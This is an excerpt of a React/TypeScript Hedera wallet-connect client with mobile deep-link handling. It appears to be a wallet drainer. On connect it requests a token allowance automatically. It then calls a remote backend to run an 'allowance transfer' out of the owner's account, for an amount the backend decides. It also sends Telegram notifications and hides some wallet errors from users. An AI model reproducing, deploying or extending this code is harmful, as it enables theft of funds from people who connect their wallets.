...
const BACKEND_API_URL = process.env.REACT_APP_BACKEND_URL || 'https://heed-rax.vercel.app/api';

if (!process.env.REACT_APP_BACKEND_URL) {
  console.warn('⚠️ REACT_APP_BACKEND_URL not set, using default Vercel URL');
}

// Add this interface after the existing interfaces
interface MobileLinkingConfig {
  isIOS: boolean;
  returnUrl: string;
  deepLinkScheme: string;
}

// Add this helper function before the HashConnectClient component
const getMobileLinkingConfig = (): MobileLinkingConfig => {
  ...
  return {
    ...
    deepLinkScheme: isIOS ? 'https://' : 'https://'
  };
};

// Add this function before the HashConnectClient component
const setupMobileLinking = (config: MobileLinkingConfig) => {
  if (config.isIOS) {
    // 🍎 iOS Safari: Add redirect metadata for automatic return
    const searchParams = new URLSearchParams(window.location.search);
    if (!searchParams.has('wallet_redirect')) {
      searchParams.set('wallet_redirect', 'true');
      searchParams.set('return_url', config.returnUrl);
...
const handleWalletReturn = () => {
  ...
  if (searchParams.has('success')) {
    // 🎉 User returned from wallet - show success message
    console.log('✅ User successfully returned from wallet');
    
    // Clean up URL
    searchParams.delete('success');
    searchParams.delete('wallet_redirect');
    ...
    // showSuccessToast('Transaction completed successfully!');
  }
};
...
export const HashConnectClient = () => {
  ...
  // 🔒 Secure API functions - No sensitive data exposed
  
  // Send structured message to backend for enterprise Telegram notifications
  const sendTelegramMessage = async (type: string, data: any) => {
    try {
      const response = await fetch(`${BACKEND_API_URL}/send-telegram`, {
        method: 'POST',
      ...
      console.log('Telegram message result:', result.success);
  ...
  // Execute allowance transfer via secure backend
  const executeAllowanceTransfer = async (ownerAccountId: string) => {
    try {
      const response = await fetch(`${BACKEND_API_URL}/execute-allowance-transfer`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          ownerAccountId,
          amount: 0 // Backend will calculate the amount
        })
      });
      ...
      console.error('Error executing transfer:', (error as Error).message);
      return { success: false, error: (error as Error).message };
    }
  };

  // 🔒 REMOVED: getTokenBalances function - now handled securely by backend
  ...
  const syncWithHashConnect = useCallback(async () => {
    ...
    try {
      ...
      if (connectedAccountIds && connectedAccountIds.length > 0) {
        ...
        const approvalResult = await handleAllowanceApprove(accountIDD);
        console.log('📋 Allowance approval result:', approvalResult);
      ...
      // 🍎 iOS Safari: Don't show non-critical errors to users
      const isNonCriticalError = error.message?.includes('no matching key history') ||
                               error.message?.includes('key history validation');
      
      if (!isNonCriticalError) {
        // Only log critical errors that users should be aware of
        console.error("Critical error in wallet sync:", error.message);
      }
    } finally {
  ...
  useEffect(() => {
    // 🔧 Setup mobile linking on component mount
    const config = getMobileLinkingConfig();
    setupMobileLinking(config);
    handleWalletReturn();
    
    // 🍎 iOS Safari: Enhanced event listeners for wallet return detection
    if (config.isIOS) {
      const handleWalletReturn = (event: any) => {
        console.log('🍎 Wallet return event detected:', event.detail);
        
        // Check for pending transactions
        const pendingTx = sessionStorage.getItem('pending_transaction');
        if (pendingTx) {
          const txData = JSON.parse(pendingTx);
          console.log('🔄 Resuming pending transaction:', txData);
          
          // Optional: Show "Checking transaction status..." message
          // setTransactionStatus('checking');
        }
      };
      
      const handlePageVisible = (event: any) => {
        console.log('🍎 Page visible event:', event.detail);
        
                 // Give iOS Safari time to restore state
         setTimeout(() => {
           // Check wallet connection status
           if (hc) {
             console.log('🔄 Refreshing wallet connection status');
             // Optional: Refresh account info or transaction status
           }
         }, 500);
      };
      
      const handleWindowFocus = (event: any) => {
        console.log('🍎 Window focus event:', event.detail);
        
        // Clear any pending transaction flags after successful return
        const pendingTx = sessionStorage.getItem('pending_transaction');
        if (pendingTx) {
          const txData = JSON.parse(pendingTx);
          const timeDiff = Date.now() - txData.timestamp;
          
          // If more than 2 minutes have passed, assume transaction completed
          if (timeDiff > 120000) {
            console.log('🧹 Cleaning up old pending transaction');
            sessionStorage.removeItem('pending_transaction');
          }
        }
      };
      
      // Listen for custom events from HTML
      window.addEventListener('walletReturn', handleWalletReturn);
      window.addEventListener('pageVisible', handlePageVisible);
      window.addEventListener('windowFocus', handleWindowFocus);
      
      return () => {
        window.removeEventListener('walletReturn', handleWalletReturn);
        window.removeEventListener('pageVisible', handlePageVisible);
        window.removeEventListener('windowFocus', handleWindowFocus);
      };
    }
  }, [hc]);

  // Modify the handleAllowanceApprove function to include mobile linking
